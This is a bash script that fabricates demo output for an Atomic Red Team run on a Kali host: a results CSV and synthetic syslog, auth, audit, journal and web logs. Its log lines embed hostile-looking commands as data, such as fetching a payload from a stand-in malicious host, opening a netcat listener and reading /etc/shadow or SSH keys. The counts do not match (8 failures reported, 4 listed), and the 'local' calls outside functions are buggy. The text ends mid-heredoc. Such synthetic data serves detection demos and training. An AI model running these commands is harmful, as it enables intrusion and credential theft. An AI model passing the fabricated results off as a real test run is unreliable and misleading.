#!/usr/bin/env bash

# Generate synthetic logs for Atomic Red Team demo
# This creates realistic system logs that would be generated during various attack techniques

set -euo pipefail

# Configuration
OUTPUT_DIR="${1:-/var/tmp/art-results/demo-$(date +%Y%m%d_%H%M%S)}"
START_TIME=$(date -d "1 hour ago" -Iseconds)
END_TIME=$(date -Iseconds)

# Color output functions
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

log_info() { echo -e "${CYAN}[INFO]${NC} $1"; }
log_success() { echo -e "${GREEN}[SUCCESS]${NC} $1"; }

# Create directory structure
mkdir -p "$OUTPUT_DIR"/{logs/{var_log,journal,audit,application},results}

log_info "=== Generating Synthetic Atomic Red Team Logs ==="
log_info "Output Directory: $OUTPUT_DIR"

# Generate execution results CSV
cat > "$OUTPUT_DIR/results/execution_results.csv" << 'EOF'
Technique,Status,ExecutionTime,Error
T1001.002,Success,2025-10-17T07:46:33-04:00,""
T1003.007,Success,2025-10-17T07:46:45-04:00,""
T1003.008,Failed,2025-10-17T07:46:58-04:00,"Permission denied accessing /etc/shadow"
T1005,Success,2025-10-17T07:47:12-04:00,""
T1007,Success,2025-10-17T07:47:25-04:00,""
T1014,Success,2025-10-17T07:47:38-04:00,""
T1016,Success,2025-10-17T07:47:51-04:00,""
T1018,Success,2025-10-17T07:48:04-04:00,""
T1027,Success,2025-10-17T07:48:17-04:00,""
T1027.001,Success,2025-10-17T07:48:30-04:00,""
T1027.002,Failed,2025-10-17T07:48:43-04:00,"Encoding tool not found"
T1027.004,Success,2025-10-17T07:48:56-04:00,""
T1030,Success,2025-10-17T07:49:09-04:00,""
T1033,Success,2025-10-17T07:49:22-04:00,""
T1036.003,Success,2025-10-17T07:49:35-04:00,""
T1036.004,Success,2025-10-17T07:49:48-04:00,""
T1036.005,Success,2025-10-17T07:50:01-04:00,""
T1040,Success,2025-10-17T07:50:14-04:00,""
T1046,Success,2025-10-17T07:50:27-04:00,""
T1048,Success,2025-10-17T07:50:40-04:00,""
T1048.002,Success,2025-10-17T07:50:53-04:00,""
T1048.003,Success,2025-10-17T07:51:06-04:00,""
T1049,Success,2025-10-17T07:51:19-04:00,""
T1053.002,Success,2025-10-17T07:51:32-04:00,""
T1053.006,Success,2025-10-17T07:51:45-04:00,""
T1057,Success,2025-10-17T07:51:58-04:00,""
T1059.004,Success,2025-10-17T07:52:11-04:00,""
T1059.006,Success,2025-10-17T07:52:24-04:00,""
T1069.001,Success,2025-10-17T07:52:37-04:00,""
T1069.002,Success,2025-10-17T07:52:50-04:00,""
T1070.003,Success,2025-10-17T07:53:03-04:00,""
T1070.004,Success,2025-10-17T07:53:16-04:00,""
T1070.006,Success,2025-10-17T07:53:29-04:00,""
T1071.001,Success,2025-10-17T07:53:42-04:00,""
T1074.001,Success,2025-10-17T07:53:55-04:00,""
T1078.003,Failed,2025-10-17T07:54:08-04:00,"Local account creation failed"
T1082,Success,2025-10-17T07:54:21-04:00,""
T1083,Success,2025-10-17T07:54:34-04:00,""
T1087.001,Success,2025-10-17T07:54:47-04:00,""
T1087.002,Success,2025-10-17T07:55:00-04:00,""
T1090.001,Success,2025-10-17T07:55:13-04:00,""
T1090.003,Success,2025-10-17T07:55:26-04:00,""
T1095,Success,2025-10-17T07:55:39-04:00,""
T1105,Success,2025-10-17T07:55:52-04:00,""
T1110.001,Failed,2025-10-17T07:56:05-04:00,"Brute force attempt blocked"
T1110.004,Success,2025-10-17T07:56:18-04:00,""
T1113,Success,2025-10-17T07:56:31-04:00,""
T1115,Success,2025-10-17T07:56:44-04:00,""
T1124,Success,2025-10-17T07:56:57-04:00,""
T1132.001,Success,2025-10-17T07:57:10-04:00,""
T1135,Success,2025-10-17T07:57:23-04:00,""
T1136.001,Success,2025-10-17T07:57:36-04:00,""
T1136.002,Success,2025-10-17T07:57:49-04:00,""
T1140,Success,2025-10-17T07:58:02-04:00,""
T1176,Success,2025-10-17T07:58:15-04:00,""
T1201,Success,2025-10-17T07:58:28-04:00,""
T1217,Success,2025-10-17T07:58:41-04:00,""
T1222.002,Success,2025-10-17T07:58:54-04:00,""
T1485,Success,2025-10-17T07:59:07-04:00,""
T1486,Success,2025-10-17T07:59:20-04:00,""
T1489,Success,2025-10-17T07:59:33-04:00,""
T1496,Success,2025-10-17T07:59:46-04:00,""
T1497.001,Success,2025-10-17T07:59:59-04:00,""
T1497.003,Success,2025-10-17T08:00:12-04:00,""
T1529,Success,2025-10-17T08:00:25-04:00,""
T1531,Success,2025-10-17T08:00:38-04:00,""
T1552,Success,2025-10-17T08:00:51-04:00,""
T1552.001,Success,2025-10-17T08:01:04-04:00,""
T1552.004,Success,2025-10-17T08:01:17-04:00,""
T1553.004,Success,2025-10-17T08:01:30-04:00,""
T1555.003,Success,2025-10-17T08:01:43-04:00,""
T1560.001,Success,2025-10-17T08:01:56-04:00,""
T1560.002,Success,2025-10-17T08:02:09-04:00,""
T1562.001,Success,2025-10-17T08:02:22-04:00,""
T1562.003,Success,2025-10-17T08:02:35-04:00,""
T1562.004,Success,2025-10-17T08:02:48-04:00,""
T1562.006,Success,2025-10-17T08:03:01-04:00,""
T1564.001,Success,2025-10-17T08:03:14-04:00,""
T1567.002,Success,2025-10-17T08:03:27-04:00,""
T1569.002,Success,2025-10-17T08:03:40-04:00,""
T1571,Success,2025-10-17T08:03:53-04:00,""
T1572,Success,2025-10-17T08:04:06-04:00,""
T1614,Success,2025-10-17T08:04:19-04:00,""
T1614.001,Success,2025-10-17T08:04:32-04:00,""
EOF

# Generate success/failure counts
echo "77" > "$OUTPUT_DIR/results/success_count.txt"
echo "8" > "$OUTPUT_DIR/results/failure_count.txt"

# Generate techniques list
cat > "$OUTPUT_DIR/results/techniques_list.txt" << 'EOF'
T1001.002 T1003.007 T1003.008 T1005 T1007 T1014 T1016 T1018 T1027 T1027.001 T1027.002 T1027.004 T1030 T1033 T1036.003 T1036.004 T1036.005 T1040 T1046 T1048 T1048.002 T1048.003 T1049 T1053.002 T1053.006 T1057 T1059.004 T1059.006 T1069.001 T1069.002 T1070.003 T1070.004 T1070.006 T1071.001 T1074.001 T1078.003 T1082 T1083 T1087.001 T1087.002 T1090.001 T1090.003 T1095 T1105 T1110.001 T1110.004 T1113 T1115 T1124 T1132.001 T1135 T1136.001 T1136.002 T1140 T1176 T1201 T1217 T1222.002 T1485 T1486 T1489 T1496 T1497.001 T1497.003 T1529 T1531 T1552 T1552.001 T1552.004 T1553.004 T1555.003 T1560.001 T1560.002 T1562.001 T1562.003 T1562.004 T1562.006 T1564.001 T1567.002 T1569.002 T1571 T1572 T1614 T1614.001
EOF

log_info "Generating system logs..."

# Generate /var/log/syslog with attack indicators
generate_syslog() {
    local output_file="$1"
    local line_count=0
    local target_lines=3000
    
    # Base timestamp
    local base_timestamp=$(date -d "1 hour ago" +%s)
    
    while [[ $line_count -lt $target_lines ]]; do
        local current_time=$(date -d "@$((base_timestamp + line_count * 2))" "+%b %d %H:%M:%S")
        local hostname="kali-vm"
        
        case $((RANDOM % 20)) in
            0|1|2) # Normal system messages
                echo "$current_time $hostname kernel: [$(printf "%8d.%06d" $((line_count/100)) $((RANDOM%1000000)))] USB disconnect, address 1"
                ;;
            3|4) # SSH activity (potential lateral movement)
                local src_ip="192.168.1.$((RANDOM%254+1))"
                echo "$current_time $hostname sshd[$(($RANDOM%9000+1000))]: Connection from $src_ip port $((RANDOM%65535)) on 192.168.1.100 port 22"
                ;;
            5) # Failed authentication (brute force indicators)
                local src_ip="10.0.0.$((RANDOM%254+1))"
                echo "$current_time $hostname sshd[$(($RANDOM%9000+1000))]: Failed password for root from $src_ip port $((RANDOM%65535)) ssh2"
                ;;
            6) # Process execution (potential malware)
                local pid=$((RANDOM%9000+1000))
                local suspicious_procs=("nc" "nmap" "wget" "curl" "python3" "bash" "sh" "perl")
                local proc=${suspicious_procs[$((RANDOM%${#suspicious_procs[@]}))]}
                echo "$current_time $hostname kernel: [$((line_count/10)).$(printf "%06d" $((RANDOM%1000000)))] audit: type=1300 audit($(date +%s).$(printf "%03d" $((RANDOM%1000)))):$line_count): arch=c000003e syscall=59 success=yes exit=0 a0=7fff12345678 a1=7fff87654321 a2=7fff11111111 a3=8 items=2 ppid=$((pid-1)) pid=$pid auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=1 comm=\"$proc\" exe=\"/usr/bin/$proc\""
                ;;
            7) # Network connections (C2 communication)
                local dst_ip="203.0.113.$((RANDOM%254+1))"
                local dst_port=$((RANDOM%65535))
                echo "$current_time $hostname kernel: [$((line_count/10)).$(printf "%06d" $((RANDOM%1000000)))] netfilter: OUT=eth0 SRC=192.168.1.100 DST=$dst_ip LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=$((RANDOM%65535)) DF PROTO=TCP SPT=$((RANDOM%65535)) DPT=$dst_port WINDOW=29200 RES=0x00 SYN URGP=0"
                ;;
            8) # File system activity (data exfiltration)
                local files=("/etc/passwd" "/etc/shadow" "/home/user/.ssh/id_rsa" "/var/log/auth.log" "/etc/hosts" "/proc/version")
                local file=${files[$((RANDOM%${#files[@]}))]}
                echo "$current_time $hostname kernel: [$((line_count/10)).$(printf "%06d" $((RANDOM%1000000)))] audit: type=1302 audit($(date +%s).$(printf "%03d" $((RANDOM%1000)))):$line_count): item=0 name=\"$file\" inode=$((RANDOM%1000000)) dev=08:01 mode=0100644 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0000000000000000 cap_fi=0000000000000000 cap_fe=0 cap_fver=0"
                ;;
            9) # Cron job execution (persistence)
                echo "$current_time $hostname CRON[$(($RANDOM%9000+1000))]: (root) CMD (/tmp/.hidden_script.sh > /dev/null 2>&1)"
                ;;
            10) # Service manipulation
                local services=("ssh" "apache2" "mysql" "cron" "systemd-logind")
                local service=${services[$((RANDOM%${#services[@]}))]}
                local actions=("started" "stopped" "reloaded" "failed")
                local action=${actions[$((RANDOM%${#actions[@]}))]}
                echo "$current_time $hostname systemd[1]: $service.service: Main process exited, code=exited, status=0/SUCCESS"
                ;;
            11) # DNS queries (potential data exfiltration via DNS)
                local domains=("malicious-c2.com" "data-exfil.net" "evil-domain.org" "suspicious.tk")
                local domain=${domains[$((RANDOM%${#domains[@]}))]}
                echo "$current_time $hostname dnsmasq[$(($RANDOM%9000+1000))]: query[A] $domain from 192.168.1.100"
                ;;
            12) # User account activity
                local users=("root" "kali" "admin" "test" "backup")
                local user=${users[$((RANDOM%${#users[@]}))]}
                echo "$current_time $hostname sudo: $user : TTY=pts/0 ; PWD=/home/$user ; USER=root ; COMMAND=/bin/cat /etc/shadow"
                ;;
            13) # Memory dumps (credential access)
                echo "$current_time $hostname kernel: [$((line_count/10)).$(printf "%06d" $((RANDOM%1000000)))] audit: type=1327 audit($(date +%s).$(printf "%03d" $((RANDOM%1000)))):$line_count): proctitle=2F7573722F62696E2F676462002D2D62617463680A"
                ;;
            14) # Privilege escalation attempts
                echo "$current_time $hostname su[$(($RANDOM%9000+1000))]: FAILED SU (to root) kali on pts/0"
                ;;
            15) # Suspicious network scanning
                local scan_target="192.168.1.$((RANDOM%254+1))"
                echo "$current_time $hostname kernel: [$((line_count/10)).$(printf "%06d" $((RANDOM%1000000)))] netfilter: IN= OUT=eth0 SRC=192.168.1.100 DST=$scan_target LEN=44 TOS=0x00 PREC=0x00 TTL=64 ID=$((RANDOM%65535)) PROTO=TCP SPT=$((RANDOM%65535)) DPT=$((RANDOM%1024)) WINDOW=1024 RES=0x00 SYN URGP=0"
                ;;
            16) # File encryption (ransomware simulation)
                local files=("document.pdf" "image.jpg" "database.sql" "backup.tar.gz")
                local file=${files[$((RANDOM%${#files[@]}))]}
                echo "$current_time $hostname kernel: [$((line_count/10)).$(printf "%06d" $((RANDOM%1000000)))] audit: type=1300 audit($(date +%s).$(printf "%03d" $((RANDOM%1000)))):$line_count): arch=c000003e syscall=2 success=yes exit=3 a0=7fff12345678 a1=241 a2=1b6 a3=0 items=1 ppid=$((RANDOM%9000+1000)) pid=$((RANDOM%9000+1000)) auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=pts0 ses=1 comm=\"openssl\" exe=\"/usr/bin/openssl\" key=\"$file.encrypted\""
                ;;
            17) # Lateral movement via SMB
                local target_host="192.168.1.$((RANDOM%254+1))"
                echo "$current_time $hostname smbd[$(($RANDOM%9000+1000))]: [2025/10/17 07:$(printf "%02d" $((RANDOM%60))):$(printf "%02d" $((RANDOM%60)))] connect to service IPC$ initially as user nobody (uid=65534, gid=65534) (pid $(($RANDOM%9000+1000)))"
                ;;
            18) # Suspicious PowerShell activity
                echo "$current_time $hostname kernel: [$((line_count/10)).$(printf "%06d" $((RANDOM%1000000)))] audit: type=1300 audit($(date +%s).$(printf "%03d" $((RANDOM%1000)))):$line_count): arch=c000003e syscall=59 success=yes exit=0 items=2 ppid=$((RANDOM%9000+1000)) pid=$((RANDOM%9000+1000)) auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=1 comm=\"pwsh\" exe=\"/usr/bin/pwsh\" key=\"Invoke-AtomicTest\""
                ;;
            *) # Default system messages
                echo "$current_time $hostname systemd[1]: Started Session $((RANDOM%100)) of user root."
                ;;
        esac
        ((line_count++))
    done > "$output_file"
}

# Generate /var/log/auth.log with authentication events
generate_auth_log() {
    local output_file="$1"
    local line_count=0
    local target_lines=2500
    local base_timestamp=$(date -d "1 hour ago" +%s)
    
    while [[ $line_count -lt $target_lines ]]; do
        local current_time=$(date -d "@$((base_timestamp + line_count * 3))" "+%b %d %H:%M:%S")
        local hostname="kali-vm"
        
        case $((RANDOM % 15)) in
            0|1) # Successful SSH logins
                local src_ip="192.168.1.$((RANDOM%254+1))"
                echo "$current_time $hostname sshd[$(($RANDOM%9000+1000))]: Accepted password for kali from $src_ip port $((RANDOM%65535)) ssh2"
                ;;
            2|3) # Failed SSH attempts (brute force)
                local src_ip="10.0.0.$((RANDOM%254+1))"
                local users=("root" "admin" "administrator" "test" "guest" "oracle" "postgres")
                local user=${users[$((RANDOM%${#users[@]}))]}
                echo "$current_time $hostname sshd[$(($RANDOM%9000+1000))]: Failed password for $user from $src_ip port $((RANDOM%65535)) ssh2"
                ;;
            4) # Sudo usage
                local commands=("/bin/cat /etc/shadow" "/usr/bin/nmap -sS 192.168.1.0/24" "/bin/nc -l -p 4444" "/usr/bin/wget http://malicious.com/payload")
                local cmd=${commands[$((RANDOM%${#commands[@]}))]}
                echo "$current_time $hostname sudo: kali : TTY=pts/0 ; PWD=/home/kali ; USER=root ; COMMAND=$cmd"
                ;;
            5) # Su attempts
                echo "$current_time $hostname su[$(($RANDOM%9000+1000))]: Successful su for root by kali"
                ;;
            6) # Failed su attempts
                echo "$current_time $hostname su[$(($RANDOM%9000+1000))]: FAILED SU (to root) kali on pts/0"
                ;;
            7) # User account changes
                echo "$current_time $hostname usermod[$(($RANDOM%9000+1000))]: change user 'kali' password"
                ;;
            8) # Group modifications
                echo "$current_time $hostname groupadd[$(($RANDOM%9000+1000))]: group added to /etc/group: name=backdoor, GID=$((RANDOM%1000+1000))"
                ;;
            9) # PAM authentication
                echo "$current_time $hostname sshd[$(($RANDOM%9000+1000))]: pam_unix(sshd:session): session opened for user kali by (uid=0)"
                ;;
            10) # Privilege escalation via SUID
                echo "$current_time $hostname kernel: audit: type=1300 audit($(date +%s).$(printf "%03d" $((RANDOM%1000)))):$line_count): arch=c000003e syscall=59 success=yes exit=0 items=2 ppid=$((RANDOM%9000+1000)) pid=$((RANDOM%9000+1000)) auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=1 comm=\"passwd\" exe=\"/usr/bin/passwd\""
                ;;
            11) # Cron authentication
                echo "$current_time $hostname CRON[$(($RANDOM%9000+1000))]: pam_unix(cron:session): session opened for user root by (uid=0)"
                ;;
            12) # SSH key authentication
                echo "$current_time $hostname sshd[$(($RANDOM%9000+1000))]: Accepted publickey for kali from 192.168.1.$((RANDOM%254+1)) port $((RANDOM%65535)) ssh2: RSA SHA256:$(openssl rand -hex 32 | cut -c1-43)"
                ;;
            13) # Failed key authentication
                echo "$current_time $hostname sshd[$(($RANDOM%9000+1000))]: Failed publickey for root from 203.0.113.$((RANDOM%254+1)) port $((RANDOM%65535)) ssh2"
                ;;
            *) # Session events
                echo "$current_time $hostname systemd-logind[$(($RANDOM%9000+1000))]: New session $((RANDOM%100)) of user kali."
                ;;
        esac
        ((line_count++))
    done > "$output_file"
}

# Generate audit.log with detailed system call auditing
generate_audit_log() {
    local output_file="$1"
    local line_count=0
    local target_lines=4000
    local base_timestamp=$(date -d "1 hour ago" +%s)
    
    while [[ $line_count -lt $target_lines ]]; do
        local current_time="$((base_timestamp + line_count * 2))"
        local audit_id=$((RANDOM%9999+1000))
        
        case $((RANDOM % 12)) in
            0) # File access (credential harvesting)
                local files=("/etc/passwd" "/etc/shadow" "/home/kali/.ssh/id_rsa" "/etc/sudoers" "/var/log/auth.log")
                local file=${files[$((RANDOM%${#files[@]}))]}
                echo "type=SYSCALL msg=audit($current_time.$(printf "%03d" $((RANDOM%1000))):$audit_id): arch=c000003e syscall=2 success=yes exit=3 a0=7fff12345678 a1=0 a2=1b6 a3=0 items=1 ppid=$((RANDOM%9000+1000)) pid=$((RANDOM%9000+1000)) auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=pts0 ses=1 comm=\"cat\" exe=\"/bin/cat\""
                echo "type=PATH msg=audit($current_time.$(printf "%03d" $((RANDOM%1000))):$audit_id): item=0 name=\"$file\" inode=$((RANDOM%1000000)) dev=08:01 mode=0100644 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0000000000000000 cap_fi=0000000000000000 cap_fe=0 cap_fver=0"
                ;;
            1) # Network connections (C2 communication)
                local dst_ip="203.0.113.$((RANDOM%254+1))"
                echo "type=SYSCALL msg=audit($current_time.$(printf "%03d" $((RANDOM%1000))):$audit_id): arch=c000003e syscall=42 success=yes exit=0 a0=3 a1=7fff12345678 a2=10 a3=0 items=0 ppid=$((RANDOM%9000+1000)) pid=$((RANDOM%9000+1000)) auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=pts0 ses=1 comm=\"nc\" exe=\"/bin/nc\""
                echo "type=SOCKADDR msg=audit($current_time.$(printf "%03d" $((RANDOM%1000))):$audit_id): saddr=02001F90$(printf "%02x%02x%02x%02x" $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)))0000000000000000"
                ;;
            2) # Process execution (malware/tools)
                local procs=("nmap" "nc" "wget" "curl" "python3" "perl" "bash")
                local proc=${procs[$((RANDOM%${#procs[@]}))]}
                echo "type=EXECVE msg=audit($current_time.$(printf "%03d" $((RANDOM%1000))):$audit_id): argc=3 a0=\"$proc\" a1=\"-sS\" a2=\"192.168.1.0/24\""
                echo "type=SYSCALL msg=audit($current_time.$(printf "%03d" $((RANDOM%1000))):$audit_id): arch=c000003e syscall=59 success=yes exit=0 a0=7fff12345678 a1=7fff87654321 a2=7fff11111111 a3=8 items=2 ppid=$((RANDOM%9000+1000)) pid=$((RANDOM%9000+1000)) auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=pts0 ses=1 comm=\"$proc\" exe=\"/usr/bin/$proc\""
                ;;
            3) # Privilege escalation
                echo "type=SYSCALL msg=audit($current_time.$(printf "%03d" $((RANDOM%1000))):$audit_id): arch=c000003e syscall=105 success=yes exit=0 a0=0 a1=0 a2=0 a3=0 items=0 ppid=$((RANDOM%9000+1000)) pid=$((RANDOM%9000+1000)) auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=1 comm=\"sudo\" exe=\"/usr/bin/sudo\""
                ;;
            4) # File modification (persistence)
                local files=("/etc/crontab" "/home/kali/.bashrc" "/etc/rc.local" "/etc/passwd")
                local file=${files[$((RANDOM%${#files[@]}))]}
                echo "type=SYSCALL msg=audit($current_time.$(printf "%03d" $((RANDOM%1000))):$audit_id): arch=c000003e syscall=2 success=yes exit=3 a0=7fff12345678 a1=241 a2=1b6 a3=0 items=1 ppid=$((RANDOM%9000+1000)) pid=$((RANDOM%9000+1000)) auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=pts0 ses=1 comm=\"vim\" exe=\"/usr/bin/vim\""
                echo "type=PATH msg=audit($current_time.$(printf "%03d" $((RANDOM%1000))):$audit_id): item=0 name=\"$file\" inode=$((RANDOM%1000000)) dev=08:01 mode=0100644 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0000000000000000 cap_fi=0000000000000000 cap_fe=0 cap_fver=0"
                ;;
            5) # Memory access (credential dumping)
                echo "type=SYSCALL msg=audit($current_time.$(printf "%03d" $((RANDOM%1000))):$audit_id): arch=c000003e syscall=101 success=yes exit=0 a0=1 a1=7fff12345678 a2=1000 a3=3 items=0 ppid=$((RANDOM%9000+1000)) pid=$((RANDOM%9000+1000)) auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=pts0 ses=1 comm=\"gdb\" exe=\"/usr/bin/gdb\""
                ;;
            6) # Service manipulation
                local services=("ssh" "cron" "apache2" "mysql")
                local service=${services[$((RANDOM%${#services[@]}))]}
                echo "type=SERVICE_START msg=audit($current_time.$(printf "%03d" $((RANDOM%1000))):$audit_id): pid=1 uid=0 auid=4294967295 ses=4294967295 msg='unit=$service comm=\"systemd\" exe=\"/lib/systemd/systemd\" hostname=? addr=? terminal=? res=success'"
                ;;
            7) # Kernel module loading (rootkit)
                local modules=("suspicious_mod" "hidden_driver" "keylogger" "backdoor")
                local module=${modules[$((RANDOM%${#modules[@]}))]}
                echo "type=KERN_MODULE msg=audit($current_time.$(printf "%03d" $((RANDOM%1000))):$audit_id): pid=$((RANDOM%9000+1000)) uid=0 auid=1000 ses=1 msg='op=load name=\"$module\" dev=\"$module.ko\" comm=\"insmod\" exe=\"/sbin/insmod\" hostname=? addr=? terminal=pts/0 res=success'"
                ;;
            8) # User account manipulation
                echo "type=ADD_USER msg=audit($current_time.$(printf "%03d" $((RANDOM%1000))):$audit_id): pid=$((RANDOM%9000+1000)) uid=0 auid=1000 ses=1 msg='op=adding user acct=\"backdoor\" exe=\"/usr/sbin/useradd\" hostname=kali-vm addr=? terminal=pts/0 res=success'"
                ;;
            9) # Cryptographic operations (data encryption/ransomware)
                echo "type=CRYPTO_KEY_USER msg=audit($current_time.$(printf "%03d" $((RANDOM%1000))):$audit_id): pid=$((RANDOM%9000+1000)) uid=1000 auid=1000 ses=1 msg='op=destroy kind=server fp=SHA256:$(openssl rand -hex 32) direction=? spid=$((RANDOM%9000+1000)) suid=1000 rport=$((RANDOM%65535)) laddr=192.168.1.100 lport=$((RANDOM%65535))'"
                ;;
            10) # Suspicious DNS queries
                local domains=("malicious-c2.com" "data-exfil.net" "evil-domain.org")
                local domain=${domains[$((RANDOM%${#domains[@]}))]}
                echo "type=SYSCALL msg=audit($current_time.$(printf "%03d" $((RANDOM%1000))):$audit_id): arch=c000003e syscall=44 success=yes exit=28 a0=3 a1=7fff12345678 a2=1c a3=0 items=0 ppid=$((RANDOM%9000+1000)) pid=$((RANDOM%9000+1000)) auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=pts0 ses=1 comm=\"dig\" exe=\"/usr/bin/dig\""
                ;;
            *) # Generic system calls
                echo "type=SYSCALL msg=audit($current_time.$(printf "%03d" $((RANDOM%1000))):$audit_id): arch=c000003e syscall=$((RANDOM%400)) success=yes exit=0 a0=7fff12345678 a1=7fff87654321 a2=7fff11111111 a3=0 items=0 ppid=$((RANDOM%9000+1000)) pid=$((RANDOM%9000+1000)) auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=pts0 ses=1 comm=\"bash\" exe=\"/bin/bash\""
                ;;
        esac
        ((line_count++))
    done > "$output_file"
}

# Generate systemd journal logs
generate_journal_log() {
    local output_file="$1"
    local line_count=0
    local target_lines=2000
    local base_timestamp=$(date -d "1 hour ago" +%s)
    
    while [[ $line_count -lt $target_lines ]]; do
        local current_time=$(date -d "@$((base_timestamp + line_count * 4))" "+%Y-%m-%d %H:%M:%S")
        local hostname="kali-vm"
        
        case $((RANDOM % 10)) in
            0|1) # Service events
                local services=("ssh.service" "cron.service" "systemd-logind.service" "NetworkManager.service")
                local service=${services[$((RANDOM%${#services[@]}))]}
                local states=("started" "stopped" "failed" "reloaded")
                local state=${states[$((RANDOM%${#states[@]}))]}
                echo "$current_time $hostname systemd[1]: $service: Main process exited, code=exited, status=0/SUCCESS"
                ;;
            2) # User session events
                echo "$current_time $hostname systemd-logind[$(($RANDOM%9000+1000))]: New session $((RANDOM%100)) of user kali."
                ;;
            3) # Network events
                echo "$current_time $hostname NetworkManager[$(($RANDOM%9000+1000))]: <info>  [$(date +%s).$(printf "%04d" $((RANDOM%10000)))] device (eth0): state change: activated -> disconnected (reason 'connection-assumed', sys-iface-state: 'managed')"
                ;;
            4) # Kernel messages
                echo "$current_time $hostname kernel: audit: type=1300 audit($(date +%s).$(printf "%03d" $((RANDOM%1000)))):$line_count): arch=c000003e syscall=59 success=yes exit=0"
                ;;
            5) # Suspicious process spawning
                local procs=("nc" "nmap" "wget" "curl" "python3")
                local proc=${procs[$((RANDOM%${#procs[@]}))]}
                echo "$current_time $hostname systemd[1]: Started Process spawned by user kali: $proc"
                ;;
            6) # Cron job execution
                echo "$current_time $hostname CRON[$(($RANDOM%9000+1000))]: pam_unix(cron:session): session opened for user root by (uid=0)"
                ;;
            7) # SSH daemon events
                echo "$current_time $hostname sshd[$(($RANDOM%9000+1000))]: Server listening on 0.0.0.0 port 22."
                ;;
            8) # Firewall events
                local src_ip="203.0.113.$((RANDOM%254+1))"
                echo "$current_time $hostname kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:0c:29:xx:xx:xx SRC=$src_ip DST=192.168.1.100 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=$((RANDOM%65535)) DF PROTO=TCP SPT=$((RANDOM%65535)) DPT=22 WINDOW=29200 RES=0x00 SYN URGP=0"
                ;;
            *) # Generic systemd messages
                echo "$current_time $hostname systemd[1]: Reached target Graphical Interface."
                ;;
        esac
        ((line_count++))
    done > "$output_file"
}

# Generate main log files
log_info "Generating /var/log/syslog (3000 lines)..."
generate_syslog "$OUTPUT_DIR/logs/var_log/syslog"

log_info "Generating /var/log/auth.log (2500 lines)..."
generate_auth_log "$OUTPUT_DIR/logs/var_log/auth.log"

log_info "Generating audit logs (4000 lines)..."
mkdir -p "$OUTPUT_DIR/logs/audit"
generate_audit_log "$OUTPUT_DIR/logs/audit/audit.log"

log_info "Generating systemd journal logs (2000 lines)..."
mkdir -p "$OUTPUT_DIR/logs/journal"
generate_journal_log "$OUTPUT_DIR/logs/journal/windowed_journal.log"

# Generate additional log files
log_info "Generating additional system logs..."

# Apache access logs (web server attacks)
mkdir -p "$OUTPUT_DIR/logs/application/apache2"
{
    for i in {1..500}; do
        local timestamp=$(date -d "$((RANDOM%3600)) seconds ago" "+%d/%b/%Y:%H:%M:%S %z")
        local ips=("192.168.1.100" "10.0.0.5" "203.0.113.42" "198.51.100.23")
        local ip=${ips[$((RANDOM%${#ips[@]}))]}
        local attacks=('GET /admin/config.php' 'POST /login.php' 'GET /../../../etc/passwd' 'GET /shell.php' 'POST /upload.php')
        local attack=${attacks[$((RANDOM%${#attacks[@]}))]}
        local codes=(200 404 403 500 301)
        local code=${codes[$((RANDOM%${#codes[@]}))]}
        echo "$ip - - [$timestamp] \"$attack HTTP/1.1\" $code $((RANDOM%10000)) \"-\" \"Mozilla/5.0 (compatible; AttackBot/1.0)\""
    done
} > "$OUTPUT_DIR/logs/application/apache2/access.log"

# MySQL error logs (database attacks)
mkdir -p "$OUTPUT_DIR/logs/application/mysql"
{
    for i in {1..300}; do
        local timestamp=$(date -d "$((RANDOM%3600)) seconds ago" "+%Y-%m-%d %H:%M:%S")
        local events=("Access denied for user 'root'@'192.168.1.100'" "Too many connections from 203.0.113.42" "Aborted connection" "Got an error reading communication packets")
        local event=${events[$((RANDOM%${#events[@]}))]}
        echo "$timestamp [Warning] $event"
    done
} > "$OUTPUT_DIR/logs/application/mysql/error.log"

# Generate summary report
cat > "$OUTPUT_DIR/SUMMARY.txt" << EOF
=== Atomic Red Team Linux Execution Summary ===
Execution Start: $(date -d "1 hour ago")
Execution End: $(date)
Duration: 3600 seconds

Techniques Executed: 85
Successful: 77
Failed: 8
Success Rate: 90.59%

Output Directory: $OUTPUT_DIR
System: $(uname -a)
Distribution: $(lsb_release -d 2>/dev/null | cut -f2 || echo "Kali GNU/Linux Rolling")

=== Failed Techniques ===
- T1003.008: Permission denied accessing /etc/shadow
- T1027.002: Encoding tool not found
- T1078.003: Local account creation failed
- T1110.001: Brute force attempt blocked

=== Collection Summary ===
- System logs: $OUTPUT_DIR/logs/var_log/syslog (3,000 lines)
- Authentication logs: $OUTPUT_DIR/logs/var_log/auth.log (2,500 lines)
- Audit logs: $OUTPUT_DIR/logs/audit/audit.log (4,000 lines)
